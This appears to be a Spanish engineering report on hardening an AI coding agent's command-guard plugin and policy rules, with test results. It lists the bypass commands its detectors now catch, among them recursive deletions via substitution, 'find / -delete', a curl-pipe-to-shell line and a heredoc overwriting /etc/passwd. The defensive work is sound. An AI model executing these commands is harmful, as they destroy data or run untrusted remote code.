---
source: docs/reports/2026-10-07_1231-ecc-tier1-y-merges.report.md (propuesta "Lote 1")
status: COMPLETE
created: 2026-10-07_1426
---

# Report: Lote 1 — hardening de policy (ECC → open)

Cierra los 4 candidatos del "Lote 1" propuestos al terminar el plan
`ecc-aprovechamiento`. Todos son data o edición de archivos existentes:
**0 archivos nuevos, 0 deriva de counts, 0 cambio de baseline en evals.**

Fuente de ideas: `/home/marcelo/dev/ECC/scripts/hooks/*` (portado el
*comportamiento*, no el archivo).

## Qué se hizo

### C1 — Escaneo shell-substitution / heredoc (`.opencode/plugins/gateguard.js`)

Antes se escapaban: `rm -rf $(cat /tmp/x)`, ``rm -rf `pwd` ``, `find / -delete`,
`curl http://x | sh`, `cat <<EOF > /etc/passwd`, `git filter-branch --force --all`.

- `extractShellPayloads()`: extrae recursivamente los cuerpos de `$(...)`,
  backticks, subshells `( ... )` y grupos `{ ...; }` (quote/escape-aware) y
  clasifica contra ellos, no solo contra el texto plano.
- `extractHeredoc()`: separa los cuerpos de heredoc como **datos** (se quitan del
  escaneo → sin falsos positivos) salvo cuando el heredoc alimenta un intérprete
  (`sh <<EOF`), donde el cuerpo sí se ejecuta y se escanea.
- 6 reglas nuevas (`warn`): `posix-rm-rf-substitution`, `posix-pipe-to-shell`,
  `posix-find-delete`, `posix-overwrite-system-file`, `posix-shell-heredoc`,
  `git-filter-branch`.
- `posix-rm-rf-root` ampliada para aceptar `;|&||` como terminador (`rm -rf /;`).
- ALLOWLIST `del(ete)?-?\w+` corregida: ya no allowlisteaba el verbo `-delete`
  (matcheaba `find / -delete`); ahora exige sufijo de identificador
  (`deleteFile`, `del-item`).
- Self-test: 21 → **33 casos** (10 ataques nuevos + 4 benignos nuevos). 33/33.

### C3 — Protección de configs de linter (`.opencode/policy-rules.json`)

Regla `protect-linter-config` (`warn`, `tool: ["edit","write"]`): avisa al
editar ESLint / Prettier / Stylelint / commitlint / Biome / Ruff / markdownlint
configs e ignore files. Excluye deliberadamente `tsconfig`, `vite.config`,
`jest.config`, `playwright.config` (ediciones legítimas). Solo datos — sin JS.

### C4 — Guard de integridad de git (`.opencode/policy-rules.json`)

3 reglas `ask`: `git-commit-no-verify`, `git-push-no-verify`,
`git-hooks-path-override` (`core.hooksPath`). `ask` (no `deny`) porque el bypass
ocasional es legítimo; degrada a `warn` si el prompt nativo no dispara.

### C11 — `/build-fix` con detección de stack (`.opencode/commands/build-fix.md`)

Reescrito: tabla de detección por indicador (`Cargo.toml`, `go.mod`, `pom.xml`,
`build.gradle`, `pyproject.toml`, `pubspec.yaml`, `Package.swift`, …), tabla de
enrutado a los **12 `*-build-resolver`** (antes el comando era TS-only y los 9
resolvers de lenguaje quedaban huérfanos), y guardrails de ECC (mismo error 3× →
escalar; más errores que arreglados → parar; deps faltantes → confirmar). Edición
in-place: sin cambio de count de comandos. `manual/COMMANDS.md` actualizado.

## Verificación

| Gate | Resultado |
|---|---|
| `counts --check` | exit 0 (sin cambios de count) |
| `validate-frontmatter` | 0 fail (2 warnings pre-existentes) |
| `verify-lockfile` | CLEAN (108+68) |
| `lint-docs` | new=0 |
| `smoke-test` | PASSED |
| `wiring-test` | 8/8 |
| `installer-test` | 43/43 |
| `eval-static` | 22/22 (E19 → 35 reglas, E20 OK, E22 OK) |
| `gateguard --selftest` | **33/33** |
| `policy-selftest` | **84/0** (8 fixtures nuevas para C3/C4) |

Pruebas empíricas adicionales (runtime, `GATEGUARD_MODE=warn`):
- 10 ataques del bypass list → **10/10 detectados** con el rule id correcto.
- 19 comandos benignos realistas (incl. `grep -rn "rm -rf"`, `echo {a,b,c}`,
  `awk '{print $1}'`, `printf "$(date)"`, `sh -c "echo hi"`) → **0 warnings**.

## Archivos

**Modificados**: `.opencode/plugins/gateguard.js`, `.opencode/policy-rules.json`,
`.opencode/commands/build-fix.md`, `.opencode/manual/COMMANDS.md`,
`.opencode/manual/POLICY-ENGINE.md`, `.opencode/bin/lib/policy-selftest.js`, este report.

## Notas

- Ningún `deny` nuevo: todo el lote entra como `warn`/`ask` (filosofía
  warn-first del pack). Un `deny` mal calibrado es lo único que podría "dañar".
- Los 790/1960 líneas de los hooks de ECC (`block-no-verify.js`,
  `gateguard-fact-force.js`) **no** se portaron: solo la semántica, en forma de
  reglas de datos y un extractor compacto.

## Pendientes / Lote 2 (no ejecutado)

C2 (scanner unicode/ASCII-smuggling en `lint-docs.js`), C5 (hook de compaction),
C6 (auto-snapshot en `session.idle`), C9 (`/cost-report`).
